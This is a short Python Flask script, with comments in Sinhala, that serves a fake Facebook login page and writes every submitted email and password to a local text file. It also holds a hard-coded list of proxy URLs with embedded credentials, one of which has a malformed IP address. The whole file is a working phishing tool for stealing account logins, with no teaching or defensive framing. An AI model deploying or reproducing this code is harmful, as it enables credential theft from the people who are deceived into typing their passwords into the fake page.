from flask import Flask, request, render_template_string
import random

app = Flask(__name__)

# ඔබේ Proxy List එක
proxy_list = [
    "http://mntxhaxb:w3izu0g3m8lc@31.59.20.176:6754/",
    "http://mntxhaxb:w3izu0g3m8lc@45.38.107.97:6014/",
    "http://mntxhaxb:w3izu0g3m8lc@198.105.121.200:6462/",
    "http://mntxhaxb:w3izu0g3m8lc@64.137.96.74:6641/",
    "http://mntxhaxb:w3izu0g3m8lc@198.23.243.226:6361/",
    "http://mntxhaxb:w3izu0g3m8lc@38.154.185.97:6370/",
    "http://mntxhaxb:w3izu0g3m8lc@84.247.60.125:6095/",
    "http://mntxhaxb:w3izu0g3m8lc@142.111.67.146:5611/",
    "http://mntxhaxb:w3izu0g3m8lc@1191.96.254.138:6185/",
    "http://mntxhaxb:w3izu0g3m8lc@31.58.9.4:6077/"
]

fb_page = """
<!DOCTYPE html>
<html>
<head>
    <title>Facebook – Log In or Sign Up</title>
    <style>
        body { font-family: Helvetica, Arial, sans-serif; background-color: #f0f2f5; margin: 0; padding: 0; }
        .container { display: flex; justify-content: center; align-items: center; height: 100vh; }
        .login-box { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); width: 350px; text-align: center; }
        input[type=text], input[type=password] { width: 90%; padding: 12px; margin: 8px 0; display: inline-block; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }
        button { width: 100%; background-color: #1877f2; color: white; padding: 14px 20px; margin: 8px 0; border: none; border-radius: 4px; cursor: pointer; font-size: 16px; }
        button:hover { background-color: #166fe5; }
        .logo { color: #1877f2; font-size: 40px; font-weight: bold; margin-bottom: 20px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="login-box">
            <div class="logo">facebook</div>
            <form action="/submit" method="POST">
                <input type="text" name="email" placeholder="Email or Phone Number" required>
                <input type="password" name="pass" placeholder="Password" required>
                <button type="submit">Log In</button>
            </form>
        </div>
    </div>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(fb_page)

@app.route('/submit', methods=['POST'])
def submit():
    email = request.form['email']
    password = request.form['pass']
    
    # Credentials save කිරීම
    with open("creds.txt", "a") as f:
        f.write(f"Email: {email} | Password: {password}\n")
        
    return "Success!"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
